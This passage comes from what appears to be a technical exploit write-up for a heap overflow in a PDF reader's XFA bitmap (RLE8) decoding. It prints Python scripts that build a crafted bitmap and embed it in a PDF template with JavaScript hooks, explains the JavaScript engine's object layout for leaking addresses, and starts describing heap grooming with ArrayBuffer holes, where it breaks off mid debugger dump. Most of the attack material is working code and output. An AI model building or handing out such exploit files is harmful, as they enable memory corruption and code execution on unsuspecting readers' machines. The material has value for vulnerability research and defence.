L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>The contents of both <code>array[0]</code> and <code>array[14]</code> are <code>41424344 ffffff81</code> , here the higher four bytes of data <code>0xFFFFFF81</code> indicates that the type of the element is <code>INT32</code> . And the contents of the elements within <code>[1, 13]</code> are all filled with <code>00000000 ffffff84</code> which means that they’re <code>undefined</code> .</p><p>If we can change the values of <code>capacity</code> and <code>length</code> , we can only achieve Out-Of-Bounds write, and the space after the original initialized elements and before the Out-Of-Bounds wrote elements will be filled with <code>00000000 ffffff84</code> . That’s some kind of meaningless.</p><p>It’s not a good idea to change <code>initializedLength</code> to a large value. This may lead to crash when scanning the array elements during GC. We’ll probably encounter inaccessible memory page and crash the process.</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>In SpiderMonkey, almost all JavaScript objects are inherited from <code>JSObject</code> , and the later class is inherited from <code>ObjectImpl</code> .</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>For <code>DataView</code> object, the <code>elements</code> member will point to <code>emptyElementsHeader</code> which can be used to leak the base address of the JavaScript engine module.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-Bitmap-Construct"><a href="#5-3-Bitmap-Construct" class="headerlink" title="5.3 Bitmap Construct"></a>5.3 Bitmap Construct</h3><p>Following python code can be used to generate a RLE compressed bitmap image.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>Here we’ll generate a RLE8 bitmap with the following parameters:</p><ul><li>width is <code>0xF0</code> </li><li>height is <code>1</code> </li><li>bit count is <code>8</code> </li></ul><p>Here the size of the heap buffer will be <code>0xF0</code> and we will be able to write <code>0xF4</code> bytes backward with value <code>0x10</code> .</p><h3 id="5-4-PDF-Construct"><a href="#5-4-PDF-Construct" class="headerlink" title="5.4 PDF Construct"></a>5.4 PDF Construct</h3><p>This section explains how to embed the generated BMP image into a PDF file. Following is the PDF template that will be used later.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>The size of the generated BMP file will be larger than 60MB. And it will be encoded in base64 and embedded within <code>6 0 obj</code> of the PDF file. To reduce the file size, this object will be compressed using the zlib/deflate compression method.</p><p>To exploit the vulnerability, we’ll need to have chances to run JavaScript code before and after triggering the vulnerability. This can be done by putting the JavaScript code within the <code>initialize</code> event and the <code>docReady</code> event.</p><p>Following python code can be used to generate the PDF file.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-Exploit-Tricks"><a href="#5-5-Exploit-Tricks" class="headerlink" title="5.5 Exploit Tricks"></a>5.5 Exploit Tricks</h3><h4 id="5-5-1-Memory-Layout-1"><a href="#5-5-1-Memory-Layout-1" class="headerlink" title="5.5.1 Memory Layout (1)"></a>5.5.1 Memory Layout (1)</h4><p>In this case, <code>ArrayBuffer</code> is more suitable for exploiting the vulnerability.</p><p>Firstly, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xE0</code> . And free one <code>ArrayBuffer</code> object of every <code>ArrayBuffer</code> pair to create holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>Then we trigger the vulnerability, and the heap buffer of the bitmap will be placed in one of the holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>Since we are able to write <code>0xF4</code> bytes backward with value <code>0x10</code> . The backing store of the <code>ArrayBuffer</code> will be filled with <code>0x10</code> .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 